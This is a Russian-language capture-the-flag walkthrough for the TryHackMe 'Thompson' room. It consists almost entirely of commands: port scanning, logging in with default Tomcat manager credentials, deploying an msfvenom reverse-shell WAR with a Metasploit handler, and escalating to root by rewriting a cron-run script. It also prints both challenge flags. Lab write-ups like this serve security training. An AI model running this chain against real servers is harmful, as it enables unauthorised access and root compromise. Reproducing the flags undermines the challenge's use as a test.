[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Thompson](https://tryhackme.com/r/room/bsidesgtthompson) 

Всего 1 заданиe:
## Задание 1
прочитать user.txt и root.txt

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sC -sV -p- <IP> 
curl -i http://<IP>:8080/manager/html
# tomcat:s3cret
msfvenom -p java/jsp_shell_reverse_tcp lhost=<YOUR_IP> lport=4444 -f war -o shell.war
msfconole -q
use multi/handler
set lhost <IP>
run -j
sessions
sessions -i 1
id
cat /home/jack/user.txt
```
```commandline
39400c90bc683a41a8935e4719f181bf
```
корень.txt
```commandline
cat /etc/crontab
cat id.sh
printf '#!/bin/bash\ncat /root/root.txt > test.txt' > id.sh
cat test.txt
```
```commandline
d89d5391984c0450a95497153ae7ca3a
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)